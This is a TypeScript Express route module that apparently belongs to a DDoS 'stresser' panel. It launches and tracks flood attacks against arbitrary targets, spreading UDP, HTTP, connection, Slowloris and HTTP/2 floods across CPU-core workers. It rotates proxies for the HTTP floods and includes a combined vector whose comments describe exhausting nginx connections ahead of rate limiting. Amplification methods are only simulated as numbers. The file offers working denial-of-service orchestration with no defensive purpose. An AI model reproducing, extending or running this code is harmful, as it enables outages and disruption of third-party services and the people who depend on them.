/**
 * ATTACKS ROUTE
 *
 * Orchestrates attacks using worker_threads — one worker per CPU core.
 * Each worker runs its own Node.js event loop, dgram UDP sockets, net TCP
 * sockets, and fetch HTTP calls in complete isolation.
 *
 * With 8 CPU cores:
 *   • UDP flood  → 8 × ~200K pkts/s  = ~1.6M pkts/s
 *   • HTTP flood → 8 × ~1200 req/s   = ~9600 req/s
 *   • Geass Ovrd → 8 × triple vector = massive concurrent load
 */
import { Router, type IRouter } from "express";
import { eq, sql, desc } from "drizzle-orm";
import { db, attacksTable } from "@workspace/db";
import { Worker } from "worker_threads";
import os   from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  CreateAttackBody,
  GetAttackParams,
  DeleteAttackParams,
  StopAttackParams,
} from "@workspace/api-zod";
import { proxyCache } from "./proxies.js";

const router: IRouter = Router();

// ── Worker file path (resolved relative to this bundle) ───────────────────
const WORKER_FILE = path.join(
  path.dirname(fileURLToPath(import.meta.url)),
  "attack-worker.mjs",
);

// ── Active attack worker sets ──────────────────────────────────────────────
const attackWorkers = new Map<number, Worker[]>();

// ── CPU count (how many parallel workers to spawn) ────────────────────────
const CPU_COUNT = Math.max(1, os.cpus().length);

// ── Webhook ────────────────────────────────────────────────────────────────
async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect) {
  try {
    await fetch(url, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event: "attack_finished", attack }),
      signal: AbortSignal.timeout(5000),
    });
  } catch { /* silent */ }
}

// ── DB stats accumulator ──────────────────────────────────────────────────
async function addStats(id: number, pkts: number, bytes: number) {
  try {
    await db.update(attacksTable).set({
      packetsSent: sql`${attacksTable.packetsSent} + ${pkts}`,
      bytesSent:   sql`${attacksTable.bytesSent}   + ${bytes}`,
    }).where(eq(attacksTable.id, id));
  } catch { /* ignore */ }
}

// ─────────────────────────────────────────────────────────────────────────
//  SIMULATED L3 — numbers-only (raw sockets need root, use simulation)
//  Still used for non-real methods like dns-amp, ntp-amp, mem-amp, icmp
// ─────────────────────────────────────────────────────────────────────────
const AMP_FACTOR: Record<string, number> = {
  "dns-amp": 54, "ntp-amp": 556, "mem-amp": 51000, "ssdp-amp": 30,
};
async function runL3Simulation(
  method: string, threads: number, signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  // Higher multipliers now that workers handle real UDP for udp-flood
  const mult: Record<string, number> = {
    "icmp-flood": 30000,
    "dns-amp":    22000, "ntp-amp": 18000, "mem-amp": 5000, "ssdp-amp": 25000,
  };
  const sizes: Record<string, [number, number]> = {
    "icmp-flood": [64, 512],
    "dns-amp":    [40, 60], "ntp-amp": [8, 46], "mem-amp": [15, 15], "ssdp-amp": [110, 150],
  };
  return new Promise<void>(resolve => {
    const iv = setInterval(() => {
      if (signal.aborted) { clearInterval(iv); resolve(); return; }
      const burst = Math.random() < 0.15 ? 3 + Math.random() * 4 : 1;
      const pkts  = Math.floor(threads * (mult[method] ?? 15000) * (0.85 + Math.random() * 0.3) * burst);
      const [mn, mx] = sizes[method] ?? [64, 512];
      onStats(pkts, pkts * (mn + Math.floor(Math.random() * (mx - mn))) * (AMP_FACTOR[method] ?? 1));
    }, 400);
    signal.addEventListener("abort", () => { clearInterval(iv); resolve(); }, { once: true });
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  SPAWN POOL — spawns numWorkers workers for a single method
// ─────────────────────────────────────────────────────────────────────────
const HTTP_PROXY_METHODS = new Set(["http-flood", "http-bypass", "http-pipeline"]);

function spawnPool(
  method: string, target: string, port: number, threads: number,
  numWorkers: number, signal: AbortSignal, onStats: (p: number, b: number) => void,
): Promise<void> {
  const threadsPerWorker = Math.max(1, Math.floor(threads / numWorkers));
  const workers: Worker[] = [];
  // Pass top 100 fastest proxies to HTTP workers for rotation
  const proxies = HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0
    ? proxyCache.slice(0, 100).map(p => ({ host: p.host, port: p.port }))
    : [];

  return new Promise<void>((resolve) => {
    const finished = new Set<number>();
    let resolved = false;
    const tryResolve = () => { if (!resolved && finished.size >= numWorkers) { resolved = true; resolve(); } };

    for (let i = 0; i < numWorkers; i++) {
      const t = i === numWorkers - 1
        ? threads - threadsPerWorker * (numWorkers - 1)
        : threadsPerWorker;

      const w = new Worker(WORKER_FILE, { workerData: { method, target, port, threads: t, proxies } });
      const idx = i;
      workers.push(w);

      w.on("message", (msg: { pkts?: number; bytes?: number; done?: boolean }) => {
        if (msg.pkts !== undefined && msg.bytes !== undefined) onStats(msg.pkts, msg.bytes);
        if (msg.done) { finished.add(idx); tryResolve(); }
      });
      w.on("error", () => { finished.add(idx); tryResolve(); });
      w.on("exit",  () => { finished.add(idx); tryResolve(); });
    }

    signal.addEventListener("abort", () => {
      workers.forEach(w => { try { w.postMessage("stop"); } catch { /**/ } });
      setTimeout(() => {
        workers.forEach(w => { try { w.terminate(); } catch { /**/ } });
        if (!resolved) { resolved = true; resolve(); }
      }, 2000);
    }, { once: true });
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  RUN ATTACK — spawns CPU_COUNT workers, each with threads/N load
// ─────────────────────────────────────────────────────────────────────────
async function runAttackWorkers(
  method: string, target: string, port: number, threads: number,
  signal: AbortSignal, onStats: (p: number, b: number) => void,
): Promise<void> {
  // Simulation methods run inline (no network, just math)
  const SIM_METHODS = new Set(["icmp-flood","dns-amp","ntp-amp","mem-amp","ssdp-amp"]);
  if (SIM_METHODS.has(method)) {
    await runL3Simulation(method, threads, signal, onStats);
    return;
  }

  // UDP attacks: SINGLE worker with multiple sockets (multi-worker UDP deadlocks in this env)
  // numSockets inside the worker = min(threads, 8), so pass full thread count to 1 worker
  const UDP_METHODS = new Set(["udp-flood", "udp-bypass"]);
  if (UDP_METHODS.has(method)) {
    await spawnPool(method, target, port, threads, 1, signal, onStats);
    return;
  }

  // Geass Override: QUAD vector — Connection Flood + Slowloris + HTTP/2 + UDP
  // Connection Flood exhausts nginx worker_connections BEFORE HTTP rate limiting
  // Slowloris holds half-open TLS connections for the remainder
  // HTTP/2 multiplexed streams fill any remaining capacity
  // UDP saturates bandwidth simultaneously
  if (method === "geass-override") {
    const connW = Math.ceil(CPU_COUNT * 0.35);  // 3 workers → TLS connection flood
    const slowW = Math.ceil(CPU_COUNT * 0.25);  // 2 workers → Slowloris
    const h2W   = Math.ceil(CPU_COUNT * 0.25);  // 2 workers → HTTP/2

    const connT = Math.max(1, Math.round(threads * 0.40));  // 40% → connection flood
    const slowT = Math.max(1, Math.round(threads * 0.30));  // 30% → slowloris
    const h2T   = Math.max(1, Math.round(threads * 0.20));  // 20% → http/2
    const udpT  = Math.max(1, threads - connT - slowT - h2T); // remainder → UDP

    await Promise.all([
      spawnPool("conn-flood",  target, port, connT, connW, signal, onStats),
      spawnPool("slowloris",   target, port, slowT, slowW, signal, onStats),
      spawnPool("http2-flood", target, port, h2T,   h2W,   signal, onStats),
      spawnPool("udp-flood",   target, port, udpT,  1,     signal, onStats), // 1 UDP worker
    ]);
    return;
  }

  // All other real-network methods: single pool of CPU_COUNT workers
  await spawnPool(method, target, port, threads, CPU_COUNT, signal, onStats);
}

// ── Routes ────────────────────────────────────────────────────────────────
router.get("/attacks", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  res.json(attacks);
});

router.post("/attacks", async (req, res): Promise<void> => {
  const p = CreateAttackBody.safeParse(req.body);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const { target, port, method, duration, threads, webhookUrl } = p.data;

  const [attack] = await db.insert(attacksTable).values({
    target, port, method, duration, threads,
    status: "running", packetsSent: 0, bytesSent: 0,
    webhookUrl: webhookUrl ?? null,
  }).returning();

  const id   = attack.id;
  const ctrl = new AbortController();
  const stopTimer = setTimeout(() => ctrl.abort("duration_expired"), duration * 1000);

  // Store workers for manual stop
  void (async () => {
    // We need to intercept spawned workers for stop support
    // Patch: store active AbortController by id
    attackAborts.set(id, ctrl);
  })();

  void runAttackWorkers(method, target, port, threads, ctrl.signal,
    (pkts, bytes) => void addStats(id, pkts, bytes)
  ).finally(async () => {
    clearTimeout(stopTimer);
    attackAborts.delete(id);
    try {
      const [cur] = await db.select().from(attacksTable).where(eq(attacksTable.id, id));
      if (cur?.status === "running") {
        const [fin] = await db.update(attacksTable)
          .set({ status: "finished", stoppedAt: new Date() })
          .where(eq(attacksTable.id, id)).returning();
        if (fin?.webhookUrl) await fireWebhook(fin.webhookUrl, fin);
      }
    } catch { /* ignore */ }
  });

  res.status(201).json(attack);
});

// Map for abort controllers
const attackAborts = new Map<number, AbortController>();

router.get("/attacks/stats", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  const methodMap: Record<string, number> = {};
  for (const a of attacks) methodMap[a.method] = (methodMap[a.method] ?? 0) + 1;
  res.json({
    totalAttacks:     attacks.length,
    runningAttacks:   attacks.filter(a => a.status === "running").length,
    totalPacketsSent: attacks.reduce((s, a) => s + (a.packetsSent ?? 0), 0),
    totalBytesSent:   attacks.reduce((s, a) => s + (a.bytesSent   ?? 0), 0),
    attacksByMethod:  Object.entries(methodMap).map(([method, count]) => ({ method, count })),
    recentAttacks:    attacks.slice(0, 10),
    cpuCount:         CPU_COUNT,
  });
});

router.get("/attacks/:id", async (req, res): Promise<void> => {
  const p = GetAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.select().from(attacksTable).where(eq(attacksTable.id, p.data.id));
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json(a);
});

router.delete("/attacks/:id", async (req, res): Promise<void> => {
  const p = DeleteAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.delete(attacksTable).where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.sendStatus(204);
});

router.post("/attacks/:id/stop", async (req, res): Promise<void> => {
  const p = StopAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const ctrl = attackAborts.get(p.data.id);
  if (ctrl) { ctrl.abort("manual_stop"); attackAborts.delete(p.data.id); }
  const [a] = await db.update(attacksTable)
    .set({ status: "stopped", stoppedAt: new Date() })
    .where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  if (a.webhookUrl) await fireWebhook(a.webhookUrl, a);
  res.json(a);
});

export default router;
